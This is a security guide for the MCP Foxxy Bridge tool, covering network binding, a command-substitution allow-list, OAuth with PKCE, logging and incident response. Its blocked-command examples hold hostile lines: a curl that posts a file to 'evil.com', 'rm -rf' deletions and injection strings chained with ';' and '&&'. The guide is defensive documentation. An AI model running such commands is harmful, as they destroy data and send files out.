# Security Guide

This guide covers the security features and best practices for MCP Foxxy Bridge.

## Overview

MCP Foxxy Bridge implements defense-in-depth security with multiple layers of protection:

- **Network Security**: Localhost-only binding by default
- **Command Substitution Security**: Allow-list based command validation
- **OAuth Authentication**: Secure authentication with PKCE
- **Input Validation**: Comprehensive parameter and argument validation
- **Shell Injection Protection**: Multi-layer protection against command injection

## Network Security

### Default Security Posture

The bridge binds to `127.0.0.1:8080` by default for maximum security:

```json
{
  "bridge": {
    "host": "127.0.0.1",  // Localhost-only access
    "port": 8080          // Standard port
  }
}
```

### External Access Considerations

If you need external access:

1. **Use specific IP binding** instead of `0.0.0.0`:
   ```json
   {
     "bridge": {
       "host": "192.168.1.100",  // Specific internal IP
       "port": 8080
     }
   }
   ```

2. **Implement firewall rules**:
   ```bash
   # Allow only specific IPs
   ufw allow from 192.168.1.0/24 to any port 8080

   # Or use iptables
   iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
   iptables -A INPUT -p tcp --dport 8080 -j DROP
   ```

3. **Consider reverse proxy** with authentication:
   ```nginx
   location /mcp/ {
       auth_basic "MCP Bridge Access";
       auth_basic_user_file /etc/nginx/.htpasswd;
       proxy_pass http://127.0.0.1:8080/;
   }
   ```

## Command Substitution Security

Command substitution allows dynamic configuration using shell commands like `$(op read secret)`. This feature includes comprehensive security validation.

### Security Model

The security model uses **allow-lists** (not block-lists) for maximum protection:

1. **Command Allow-List**: Only pre-approved commands are allowed
2. **Argument Validation**: Command arguments are validated for safety
3. **Shell Injection Protection**: Shell operators are blocked
4. **Read-Only Enforcement**: Write/delete operations are prevented

### Enabling Command Substitution

Command substitution is **disabled by default**. Enable it explicitly:

**Via Configuration:**
```json
{
  "bridge": {
    "allow_command_substitution": true
  }
}
```

**Via CLI:**
```bash
mcp-foxxy-bridge --bridge-config config.json --allow-command-substitution
```

**Via Environment:**
```bash
export MCP_ALLOW_COMMAND_SUBSTITUTION=true
mcp-foxxy-bridge --bridge-config config.json
```

### Allowed Commands

**Default allowed commands** (read-only operations):
- **System info**: `echo`, `printf`, `env`, `printenv`, `pwd`, `uname`, `date`, `whoami`
- **Secret management**: `op` (1Password), `vault` (HashiCorp Vault)
- **Data processing**: `base64`, `jq`
- **Version control**: `git` (read-only), `gh` (GitHub CLI, read-only)
- **Text processing**: `grep`, `cat`, `head`, `tail`
- **Network**: `curl`, `wget` (read-only)

### Custom Command Lists

**Restrict to specific commands:**
```json
{
  "bridge": {
    "allow_command_substitution": true,
    "allowed_commands": ["op", "vault", "git"]
  }
}
```

**Add additional commands via environment:**
```bash
export MCP_ALLOWED_COMMANDS=mycommand,anothercmd
```

### Command Validation

Each command is validated through multiple security checks:

#### 1. Command Allow-List Check
```bash
# ✅ Allowed
$(op read op://vault/item/credential)
$(git rev-parse HEAD)

# ❌ Blocked - not in allow-list
$(rm -rf /tmp/*)
$(curl -X POST -d @file.txt evil.com)
```

#### 2. Shell Injection Protection
```bash
# ❌ Blocked - shell operators
$(op read secret; rm -rf /)
$(git status && curl evil.com)
$(echo test | base64)

# ✅ Allowed - single commands
$(op read op://vault/secret)
$(git status)
$(base64 file.txt)
```

#### 3. Argument Validation

**Git Commands** - Only read-only operations:
```bash
# ✅ Allowed
$(git status)
$(git log --oneline)
$(git rev-parse HEAD)
$(git diff)

# ❌ Blocked
$(git push)
$(git commit -m "test")
$(git reset --hard)
```

**Vault Commands** - Only read operations:
```bash
# ✅ Allowed
$(vault read secret/data/myapp)
$(vault kv get -field=password secret/db)
$(vault list secret/)

# ❌ Blocked
$(vault write secret/data/test value=123)
$(vault delete secret/data/test)
```

**1Password CLI** - Only read operations:
```bash
# ✅ Allowed
$(op read op://Private/Login/password)
$(op get item "My Login")
$(op list items)

# ❌ Blocked
$(op create item)
$(op edit item uuid --title="New Title")
$(op delete item uuid)
```

### Dangerous Commands Mode

⚠️ **UNSAFE MODE** - For testing only:

```bash
# DANGEROUS: Disables ALL security validation
mcp-foxxy-bridge --bridge-config config.json --allow-dangerous-commands
```

This mode:
- Bypasses all command validation
- Allows any command execution
- Shows prominent security warnings
- Should **NEVER** be used in production

### Security Best Practices

1. **Principle of Least Privilege**: Only enable commands you actually need
2. **Environment Isolation**: Run bridge in isolated environments when using command substitution
3. **Regular Auditing**: Monitor logs for command execution
4. **Secure Credential Storage**: Use proper secret management (1Password, Vault, etc.)
5. **Network Segmentation**: Keep bridge on isolated networks when possible

### Example: Secure Secrets Configuration

```json
{
  "mcpServers": {
    "secure-app": {
      "enabled": true,
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "$(op read op://Private/GitHub/token)",
        "DATABASE_PASSWORD": "$(vault kv get -field=password secret/myapp/db)",
        "API_ENDPOINT": "${API_ENDPOINT:https://api.github.com}"
      }
    }
  },
  "bridge": {
    "allow_command_substitution": true,
    "allowed_commands": ["op", "vault"],
    "conflictResolution": "namespace"
  }
}
```

## OAuth Authentication Security

The bridge implements OAuth 2.0 with PKCE (Proof Key for Code Exchange) for enhanced security.

### OAuth Security Features

- **PKCE Support**: Protects against authorization code interception
- **State Parameter**: Prevents CSRF attacks
- **Secure Token Storage**: Tokens stored in local filesystem with appropriate permissions
- **Automatic Discovery**: OAuth endpoints discovered from server metadata
- **Token Refresh**: Automatic token renewal when possible

### OAuth Configuration

```json
{
  "mcpServers": {
    "protected-service": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-atlassian"],
      "oauth": {
        "enabled": true,
        "issuer": "https://auth.atlassian.com"
      }
    }
  },
  "bridge": {
    "oauth_port": 8090  // Dedicated OAuth callback port
  }
}
```

### OAuth Flow Security

1. **Authorization Request**: Uses PKCE code challenge
2. **User Authentication**: Performed in user's browser
3. **Authorization Code**: Exchanged for tokens using PKCE verifier
4. **Token Storage**: Stored securely in `~/.foxxy-bridge/auth/`
5. **Token Usage**: Applied automatically to MCP server requests

## Input Validation

All configuration inputs are validated:

- **JSON Schema Validation**: Configuration structure is validated
- **Type Checking**: All parameters have strict type checking
- **Range Validation**: Numeric values are range-checked
- **Path Validation**: File paths are validated for safety
- **URL Validation**: URLs are validated and sanitized

## Monitoring and Logging

### Security Event Logging

The bridge logs security-relevant events:

```bash
# Command substitution events
INFO: Command substitution enabled for configuration loading
WARNING: Potentially unsafe command blocked: rm -rf /
ERROR: Shell injection attempt detected in command: $(echo test; rm file)

# OAuth events
INFO: OAuth flow initiated for server 'atlassian'
INFO: OAuth tokens refreshed for server 'github'
WARNING: OAuth token expired, user re-authentication required

# Network events
INFO: Bridge server started on 127.0.0.1:8080
WARNING: External connection attempt from 192.168.1.100
```

### Log Analysis

Monitor logs for security events:

```bash
# Monitor for security warnings
tail -f /var/log/mcp-bridge.log | grep -E "(SECURITY|WARNING|ERROR)"

# Check for command substitution usage
grep "Command substitution" /var/log/mcp-bridge.log

# Monitor OAuth events
grep "OAuth" /var/log/mcp-bridge.log
```

## Incident Response

### Security Incident Checklist

1. **Immediate Response**:
   - Stop the bridge service
   - Review recent logs for indicators of compromise
   - Check command substitution usage logs

2. **Investigation**:
   - Analyze configuration files for unauthorized changes
   - Review OAuth token storage for tampering
   - Check network connections and access logs

3. **Remediation**:
   - Revoke and regenerate OAuth tokens if compromised
   - Update configuration with stricter security settings
   - Apply network access controls

4. **Prevention**:
   - Review and restrict command allow-lists
   - Implement additional monitoring
   - Update security configurations

## Security Hardening Checklist

- [ ] Bridge binds to localhost-only (`127.0.0.1`)
- [ ] Command substitution disabled unless specifically needed
- [ ] Custom command allow-lists defined when using command substitution
- [ ] OAuth authentication enabled for sensitive services
- [ ] Firewall rules in place for external access
- [ ] Logging enabled and monitored
- [ ] Regular security updates applied
- [ ] Configuration files have appropriate permissions
- [ ] OAuth token storage secured
- [ ] Network segmentation implemented where possible

## Reporting Security Issues

If you discover security vulnerabilities:

1. **Do not** create public GitHub issues for security problems
2. Contact the maintainers privately via email
3. Provide detailed reproduction steps
4. Allow reasonable time for fixes before public disclosure

Follow responsible disclosure practices to help keep all users secure.
